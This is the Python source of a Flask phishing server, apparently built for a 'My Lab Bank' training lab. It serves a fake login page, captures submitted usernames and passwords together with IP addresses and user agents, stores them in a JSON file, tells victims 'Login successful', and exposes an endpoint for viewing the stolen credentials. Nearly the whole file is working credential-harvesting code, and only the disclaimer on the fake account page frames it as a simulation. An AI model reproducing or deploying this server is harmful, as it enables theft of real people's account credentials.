#!/usr/bin/env python3
import os
import json
import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_cors import CORS

app = Flask(__name__)
CORS(app)  # Allow cross-origin requests

# Store captured credentials
captured_credentials = []

@app.route('/')
def index():
    """Serve the phishing login page"""
    return send_from_directory('.', 'index.html')


@app.route('/capture', methods=['POST'])
def capture_credentials():
    """Capture credentials from the phishing form"""
    try:
        data = request.get_json()
        
        # Extract credentials
        username = data.get('username', '')
        password = data.get('password', '')
        timestamp = data.get('timestamp', '')
        user_agent = data.get('userAgent', '')
        referrer = data.get('referrer', '')
        
        # Create credential entry
        credential_entry = {
            'username': username,
            'password': password,
            'timestamp': timestamp,
            'user_agent': user_agent,
            'referrer': referrer,
            'ip_address': request.remote_addr,
            'capture_time': datetime.datetime.now().isoformat()
        }
        
        # Add to captured credentials list
        captured_credentials.append(credential_entry)
        
        # Print to console (attacker's terminal)
        print("\n" + "="*60)
        print("🎯 CREDENTIALS CAPTURED! 🎯")
        print("="*60)
        print(f"Username: {username}")
        print(f"Password: {password}")
        print(f"IP Address: {request.remote_addr}")
        print(f"User Agent: {user_agent}")
        print(f"Timestamp: {timestamp}")
        print(f"Referrer: {referrer}")
        print("="*60)
        print(f"Total credentials captured: {len(captured_credentials)}")
        print("="*60 + "\n")
        
        # Save to file
        save_credentials_to_file(credential_entry)
        
        # Return success response to the phishing page
        return jsonify({'success': True, 'message': 'Login successful'})
        
    except Exception as e:
        print(f"[-] Error capturing credentials: {e}")
        return jsonify({'success': False, 'message': 'Login failed'})

@app.route('/credentials')
def view_credentials():
    """View all captured credentials (for attacker)"""
    if not captured_credentials:
        return jsonify({'message': 'No credentials captured yet'})
    
    return jsonify({
        'total_captured': len(captured_credentials),
        'credentials': captured_credentials
    })

@app.route('/clear')
def clear_credentials():
    """Clear all captured credentials"""
    global captured_credentials
    count = len(captured_credentials)
    captured_credentials = []
    return jsonify({'message': f'Cleared {count} captured credentials'})

def save_credentials_to_file(credential_entry):
    """Save credentials to a file for persistence"""
    try:
        filename = 'captured_credentials.json'
        
        # Load existing credentials
        existing_credentials = []
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                existing_credentials = json.load(f)
        
        # Add new credential
        existing_credentials.append(credential_entry)
        
        # Save back to file
        with open(filename, 'w') as f:
            json.dump(existing_credentials, f, indent=2)
            
        print(f"[+] Credentials saved to {filename}")
        
    except Exception as e:
        print(f"[-] Error saving credentials to file: {e}")

def load_credentials_from_file():
    """Load previously captured credentials from file"""
    global captured_credentials
    try:
        filename = 'captured_credentials.json'
        if os.path.exists(filename):
            with open(filename, 'r') as f:
                captured_credentials = json.load(f)
            print(f"[+] Loaded {len(captured_credentials)} previously captured credentials")
    except Exception as e:
        print(f"[-] Error loading credentials from file: {e}")

@app.route('/status')
def status():
    """Check server status"""
    return jsonify({
        'status': 'running',
        'captured_count': len(captured_credentials),
        'server_time': datetime.datetime.now().isoformat()
    })

@app.route('/account')
def account():
    """Fake account page (for redirects)"""
    return """
    <!DOCTYPE html>
    <html>
    <head>
        <title>My Lab Bank - Account</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .container { max-width: 800px; margin: 0 auto; }
            .header { background: #3498db; color: white; padding: 20px; border-radius: 5px; }
            .content { margin-top: 20px; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="header">
                <h1>My Lab Bank - Account Dashboard</h1>
            </div>
            <div class="content">
                <h2>Welcome to your account!</h2>
                <p>This is a demo page. Your credentials have been captured for educational purposes.</p>
                <p><strong>This is a phishing simulation - no real banking data was accessed.</strong></p>
            </div>
        </div>
    </body>
    </html>
    """

if __name__ == '__main__':
    # Load previously captured credentials
    load_credentials_from_file()
    
    print("\n" + "="*60)
    print("🎣 PHISHING SERVER STARTED 🎣")
    print("="*60)
    print("Server: http://10.0.0.10:8080")
    print("Phishing page: http://10.0.0.10:8080/")
    print("View credentials: http://10.0.0.10:8080/credentials")
    print("Clear credentials: http://10.0.0.10:8080/clear")
    print("Server status: http://10.0.0.10:8080/status")
    print("="*60)
    print("Waiting for victims to submit credentials...")
    print("="*60 + "\n")
    
    # Start the server
    app.run(host='0.0.0.0', port=8080, debug=False)